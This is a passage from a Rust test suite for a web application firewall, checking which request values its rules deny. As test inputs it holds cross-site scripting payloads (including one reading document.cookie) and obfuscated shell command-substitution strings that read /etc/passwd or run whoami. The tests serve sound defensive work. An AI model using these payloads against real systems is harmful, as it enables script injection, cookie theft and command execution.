                }
            }
        }
    }

    #[test]
    fn an_xss_payload_in_a_request_header_is_denied_raw() {
        // CRS rule 941100 reads the `User-Agent` and `Referer` headers and no other; a payload in a custom header
        // scored 0 (23 requests of the X2 matrix that rules 10941100 and 10941101 used to catch only through the raw
        // value).
        for multiphase in [false, true] {
            let waf = hardening_waf(multiphase);
            for header in ["X-Custom-Data", "Referer", "User-Agent", "X-Forwarded-Host"] {
                for payload in [
                    "<img src=x onerror=alert(1)>",
                    "<meta http-equiv=\"Set-Cookie\" content=\"a=b\">",
                    "<script>alert(document.cookie)</script>",
                ] {
                    assert_eq!(
                        denied_by_header(&waf, header, payload.as_bytes()),
                        Some(10_941_102),
                        "{payload} in {header} (multiphase={multiphase})"
                    );
                }
            }
            // Headers that carry no free text, and ordinary values.
            for (header, value) in [
                ("Accept", "text/html,<img src=x onerror=alert(1)>"),
                ("Cookie", "<img src=x onerror=alert(1)>"),
                ("X-Custom-Data", "a < b and c > d"),
                ("X-Custom-Data", "5 <3 you, 4> 3"),
                (
                    "User-Agent",
                    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
                ),
                ("Referer", "https://example.com/search?q=a%3Cb"),
            ] {
                assert_ne!(
                    denied_by_header(&waf, header, value.as_bytes()),
                    Some(10_941_102),
                    "{value} in {header} (multiphase={multiphase})"
                );
            }
        }
    }

    #[test]
    fn a_backtick_command_is_not_denied_without_the_crs() {
        // The rule is labelled PL3 and above: without the CRS no paranoia level is set, and it must not run. A policy
        // without the CRS would hard-deny the code spans of a comment field.
        for multiphase in [false, true] {
            let waf = hardening_waf(multiphase);
            for value in [
                "echo `whoami`",
                "foo`id`",
                "x;`cat /etc/hosts`",
                "join on the `id` column",
            ] {
                assert_eq!(
                    denied_by(&waf, value.as_bytes()),
                    None,
                    "{value:?} (multiphase={multiphase})"
                );
            }
        }
    }

    #[test]
    fn a_backtick_command_is_denied_at_the_blocking_paranoia_level_not_the_detection_level() {
        // The CRS lets a deployment detect at a higher level than it blocks: a match below the blocking level is
        // logged only, and a `deny` rule must not turn that into a block.
        for (blocking, detection, denied) in [
            (1, 1, false),
            (1, 3, false),
            (2, 4, false),
            (3, 3, true),
            (3, 4, true),
            (4, 4, true),
        ] {
            let waf = hardening_waf_at(blocking, detection);
            for value in ["join on the `id` column", "echo `whoami`"] {
                assert_eq!(
                    denied_by(&waf, value.as_bytes()),
                    denied.then_some(10_932_238),
                    "{value:?} with blocking level {blocking} and detection level {detection}"
                );
            }
        }
    }

    #[test]
    fn a_command_substitution_that_prints_nothing_is_denied_inside_a_word() {
        for multiphase in [false, true] {
            let waf = hardening_waf(multiphase);
            for value in [
                ";c`~`at /e`~`tc/pa`~`sswd",
                ";c`:`at /e`:`tc/pa`:`sswd",
                ";c`true`at /e`true`tc/pa`true`sswd",
                ";c$()at /e$()tc/pa$()sswd",
                "who``ami",
                "ca$(:)t x",
                "l%60%3A%60s",
                // Whitespace only between the backticks or the parentheses.
                ";c` `at /e` `tc/pa` `sswd",
                ";c`\t`at /e`  `tc/pa`\t `sswd",
                ";c$( )at /e$(\t)tc/pa$(  )sswd",
                "x=c`~`at",
                "\"c`~`at\"",
            ] {
                assert_eq!(
                    denied_by(&waf, value.as_bytes()),
                    Some(10_932_130),
                    "{value:?} (multiphase={multiphase})"
                );
            }
            for value in [
                "Use `go`/`direct` here",
                "a `b` c `d` e",
                "see `msg`,`logdata` and `0`/`1`",
                "`a`.`b` and `x`-`y`",
                "price $5 (approx)",
                // Code spans joined by a colon, a backtick used as an apostrophe, quoted SQL identifiers and `$@`
                // between non-word characters are prose and shell, not a word split by a substitution.
                "Use `ARGS_GET`:`x` here",
                "`a`:`b`",
                "I don`t think it`s ready",
                "SELECT `a`.`b` FROM `db`.`t`",
                "exec \"$@\" and $@ here",
                // An empty `$@` or `$*` inside a word is not matched: a generated password holds it in 0.1 to 0.7
                // percent of the cases, and the shape is one of many empty expansions (`c$9at`, `c${x}at`, `c$x`).
                ";c$@at /e$@tc/pa$@sswd",
                ";c$*at /e$*tc/pa$*sswd",
                "gbEb$@9NyFCfvt0d",
                "8K#^Q%qp$*I5WExW",
                "x$@y",
            ] {
                assert_eq!(
                    denied_by(&waf, value.as_bytes()),
                    None,
                    "{value:?} (multiphase={multiphase})"
                );
            }
        }
    }
}
